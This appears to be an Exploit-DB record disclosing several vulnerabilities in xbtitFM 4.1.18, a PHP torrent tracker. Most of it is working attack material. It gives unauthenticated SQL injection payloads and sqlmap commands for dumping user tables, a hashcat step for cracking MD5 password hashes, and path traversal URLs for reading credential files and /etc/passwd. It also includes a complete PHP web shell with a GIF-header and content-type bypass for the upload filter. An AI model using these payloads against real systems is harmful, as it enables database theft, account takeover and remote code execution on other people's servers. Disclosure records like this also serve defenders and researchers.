{"source": "https://www.exploit-db.com/exploits/51909", "vulnName": "xbtitFM 4.1.18 - Multiple Vulnerabilities", "vulnEDBID": "51909", "vulnCVE": "N/A", "author": "H5KJ23KJ32IO2KJ", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-03-18", "vulnContent": "# Exploit Title: xbtitFM 4.1.18 Multiple Vulnerabilities\n# Date: 22-01-2024\n# Vendor Homepage: https://xbtitfm.eu\n# Affected versions: 4.1.18 and prior\n# Description: The SQLi and the path traversal are unauthenticated, they don't require any user interaction to be exploited and are present in the default configuration of xbtitFM.\nThe insecure file upload requires the file_hosting feature (hack) being enabled. If not, it can be enabled by gaining access to an administrator account.\nLooking at the state and the age of the codebase there are probably more, but who cares anyway...\n\n[Unauthenticated SQL Injection - CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H]\n\nSome examples:\nGet DB name:\n/shoutedit.php?action=edit&msgid=1337 AND EXTRACTVALUE(0,CONCAT(0,0,(MID((IFNULL(CAST(DATABA SE() AS NCHAR),0)),1,100))))\n\nGet DB user:\n/shoutedit.php?action=edit&msgid=1337 AND EXTRACTVALUE(0,CONCAT(0,0,(MID((IFNULL(CAST(CURREN T_USER() AS NCHAR),0)),1,100))))\n\nGet password hash of any user (might need some modification to work on different instances):\n/shoutedit.php?action=edit&msgid=1337 OR (1,1) = (SELECT COUNT(0),CONCAT((SELECT CONCAT_WS(0x3a,id,username,password,email,0x3a3a3a ) FROM xbtit_users WHERE username='admin_username_or_whatever_you_like'),FL OOR(RAND(0)*2)) FROM (information_schema.tables) GROUP BY 2);\n\nAutomate it with sqlmap to dump the database.\n1) Get DB name\nsqlmap -u \"https://example.xyz/shoutedit.php?action=edit&msgid=1337\" -p msgid --technique=E --answers=\"include=N\" --batch --current-db\n2) Get table names\nsqlmap -u \"https://example.xyz/shoutedit.php?action=edit&msgid=1337\" -p msgid --technique=E --answers=\"include=N\" --batch -D the_identified_database_name --tables\n3) Dump users table (usually called xbtit_users)\nsqlmap -u \"https://example.xyz/shoutedit.php?action=edit&msgid=1337\" -p msgid --technique=E --answers=\"include=N\" --batch -D the_identified_database_name -T xbtit_users -C id,username,email,cip,dob,password,salt,secret --dump\n4) Crack hashes (usually unsalted MD5, yey!)\nhashcat -m 0 xbtitfm_exported_hashes.txt wordlist.txt\nPro tip: Use All-in-One-P (https://weakpass.com/all-in-one)\n\n[Unauthenticated Path traversal - CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]\n\n1) Intentionally search for a file that doesn't exist to get the web application path e.g. (/home/xbtitfm/public_html/)\nhttps[:]//example.xyz/nfo/nfogen.php?nfo=random_value_to_get_error_that_reve als_the_real_path\n\n2) Read files that contain database credentials.\nhttps[:]//example.xyz/nfo/nfogen.php?nfo=../../../../../../../home/xbtitfm/public_html/include/settings.php\nhttps[:]//example.xyz/nfo/nfogen.php?nfo=../../../../../../../home/xbtitfm/public_html/include/update.php\n\nOr any other system file you want.\nhttps[:]//example.xyz/nfo/nfogen.php?nfo=../../../../../../../etc/passwd\n\n3) Now who needs the SQLi to dump the DB when you have this gem? Check if the following file is configured\nhttps[:]//example.xyz/nfo/nfogen.php?nfo=../../../../../../../home/xbtitfm/public_html/sxd/cfg.php\nIf so, go to https[:]//example.xyz/sxd (CBT Sql backup utilitiy aka Sypex-Dumper), login with the DB credentials you just found, now export the DB with on click. Nice and easy.\n\n[Insecure file upload - Remote Code Execution (Authenticated)- CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H]\n\nIf that wasn't enough already and you want RCE, visit https[:]//example.xyz/index.php?page=file_hosting\nIf the file hosting feature (hack) is enabled, then simply just upload a PHP shell with the following bypass.\nChanging the Content-Type of the file to image/gif and the first bytes to GIF89a; are enough to bypass the filetype checks.\nA silly countermeasure against PHP files is in place so make sure you change <?php to <?pHp to bypass it.\n\nContent-Disposition: form-data; name=\"file\"; filename=\"definately_not_a_shell.php\"\nContent-Type: image/gif\n\nGIF89a;\n<html>\n<body>\n<form method=\"GET\" name=\"<?pHp echo basename($_SERVER['PHP_SELF']); ?>\">\n<input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\">\n<input type=\"SUBMIT\" value=\"Execute\">\n</form>\n\n<pre>\n<?pHp\n\nif(isset($_GET['cmd']))\n{\nsystem($_GET['cmd']);\n}\n?>\n\n</pre>\n</body>\n</html>\n\nThe web shell will then be uploaded here:\nhttps[:]//example.xyz/file_hosting/definately_not_a_shell.php\n\nIf the file hosting feature is disabled, extract and crack the hash of an admin, then enable the feature from the administration panel and upload the shell.\n            "}